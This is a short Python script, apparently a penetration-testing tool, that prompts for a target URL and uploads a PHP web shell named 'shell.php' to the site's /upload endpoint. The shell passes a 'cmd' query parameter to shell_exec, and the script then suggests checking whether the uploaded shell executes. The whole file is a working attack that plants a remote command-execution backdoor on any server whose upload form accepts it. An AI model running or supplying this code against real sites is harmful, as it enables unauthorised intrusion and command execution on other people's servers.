import requests

def test_file_upload(target_url):
    url = f"{target_url.rstrip('/')}/upload"
    files = {
        'file': ('shell.php', '<?php echo shell_exec($_GET["cmd"]); ?>', 'application/x-php')
    }

    try:
        response = requests.post(url, files=files, timeout=10)
        if response.status_code == 200:
            print("[+] File upload successful — check if the uploaded shell executes.")
        else:
            print(f"[!] File upload failed. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during file upload: {e}")

if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., http://example.com): ").strip()
    test_file_upload(target_url)
